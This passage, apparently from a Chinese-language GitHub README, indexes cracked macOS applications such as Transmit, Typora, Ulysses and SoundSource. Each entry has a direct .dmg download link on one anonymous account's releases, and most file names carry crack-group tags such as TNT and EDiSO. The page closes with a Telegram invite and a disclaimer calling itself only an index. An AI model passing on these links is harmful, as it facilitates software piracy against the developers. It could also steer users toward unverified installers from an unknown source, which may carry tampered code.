| **Soundsource** | 5.8.10 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.8.10_ecruosdnuos/SoundSource_5.8.10_TNT.dmg) |
| **Spamsieve** | 3.2.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.2.2_eveismaps/SpamSieve_3.2.2_TNT.dmg) |
| **Splayer** | 1.7.56 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.7.56_reyalps/sPlayer_1.7.56_MAS_TNT.dmg) |
| **Ssh Config Editor** | 2.6.10 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.6.10_rotide_gifnoc_hss/SSH_Config_Editor_2.6.10_TNT.dmg) |
| **Stoic** | 2025.42 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2025.42_ciots/Stoic_2025.42_EDiSO.dmg) |
| **Superwhisper** | 2.7.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.7.2_repsihwrepus/superwhisper_2.7.1.dmg) |
| **Swiftserver** | 1.1.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_3.1.1_revrestfiws/SwiftServer_1.1.3.dmg) |
| **Swish** | 1.13.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.31.1_hsiws/Swish_1.13.1.dmg) |
| **System Dashboard Pro** | 3.0.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.0.5_orp_draobhsad_metsys/System_Dashboard_Pro_3.0.5_MAS_TNT.dmg) |
| **Tabtab** | 2.0.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_4.0.2_batbat/TabTab_2.0.4.dmg) |
| **Text Workflow** | 2.6.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.6.0_wolfkrow_txet/Text_Workflow_2.6.0_MAS_TNT.dmg) |
| **Timemator** | 3.2.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.2.0_rotamemit/Timemator_3.2.0_TNT.dmg) |
| **Toontrack** | 2.1.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_kcartnoot/Toontrack_EZkeys_2.1.4.dmg) |
| **Topaz Gigapixel** | 1.0.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_4.0.1_lexipagig_zapot/Topaz_Gigapixel_1.0.4.dmg) |
| **Transmit** | 5.11.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.11.2_timsnart/Transmit_5.11.2_TNT.dmg) |
| **Typora** | 1.12.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.12.4_aropyt/Typora_1.12.4_TNT.dmg) |
| **Ulysses** | 39.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.93_sessylu/Ulysses_39.1.dmg) |
| **Ulysses 39** | 39 | [下载](https://github.com/YorkRaleign6/macos/releases/download/39_sessylu/Ulysses_39_EDiSO.dmg) |
| **Usbclean** | 4.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.5_naelcbsu/USBclean_4.5_TNT.dmg) |
| **Vellum** | 4.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.0_mullev/Vellum_4.0_EDiSO.dmg) |
| **Videobyte Bd-Dvd Ripper** | 2.1.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.1.6_reppir_dvd-db_etyboediv/VideoByte_BD-DVD_Ripper_2.1.6_25296_TNT.dmg) |
| **Videobyte Blu-Ray Player** | 1.1.66 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.1.66_reyalp_yar-ulb_etyboediv/VideoByte_Blu-ray_Player_1.1.66_157674_TNT.dmg) |
| **Videoconverterx** | 1.3.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.3.2_xretrevnocoediv/VideoConverterX_1.3.2_MAS_TNT.dmg) |
| **Videoproc Converter Ai** | 8.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/8.6_ia_retrevnoc_corpoediv/VideoProc_Converter_AI_8.6_2025102301_TNT.dmg) |
| **Vuescan** | 9.8.49 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_94.8.9_nacseuv/VueScan_9.8.49.dmg) |
| **Whisper** | 13.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_6.31_repsihw/Whisper_13.6.dmg) |
| **Whisper Mate** | 9.9.7 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_7.9.9_etam_repsihw/Whisper_Mate_9.9.7.dmg) |
| **Whisper Transcription** | 13.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_5.31_noitpircsnart_repsihw/Whisper_Transcription_13.5.dmg) |
| **Widgetter** | 2.3.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_4.3.2_rettegdiw/Widgetter_2.3.4.dmg) |
| **Widgetwall** | 3.14 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_41.3_llawtegdiw/WidgetWall_3.14.dmg) |
| **Wifi Explorer Pro** | 3.9.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3_orp_rerolpxe_ifiw/WiFi_Explorer_Pro_3_3.9.1_TNT.dmg) |
| **Wifispoof** | 4.1.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.1.3_foopsifiw/WiFiSpoof_4.1.3_TNT.dmg) |
| **Xliff Editor** | 3.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.1_rotide_ffilx/Xliff_Editor_3.1_TNT.dmg) |
| **Xmas Snow** | 1.6.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.6.2_wons_samx/Xmas_snow_1.6.2_MAS_TNT.dmg) |
| **Xmind** | 26.01.07145 | [下载](https://github.com/YorkRaleign6/macos/releases/download/Xmind_v26.01/Xmind_26.01.07145.dmg) |
| **Zipic** | 1.8.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.8.4_cipiz/Zipic_1.8.4_EDiSO.dmg) |
| **dBpoweramp Music Converter** | 2025.12.04 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2025.12.04_retrevnoc_cisum_pmarewopbd/dBpoweramp_Music_Converter_2025.12.04_Reference.dmg) |
| **iShot Pro** | 2.6.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/iShot_Pro_v2.6.5/iShot.Pro_2.6.5.dmg) |

### 🤝 贡献

欢迎提交 Issue 和建议！

### 📧 联系方式

- Telegram: https://t.me/+1q4fhbPDG2lkMzg1

### 📄 许可证

本仓库仅作为索引使用，所有软件版权归原作者所有。
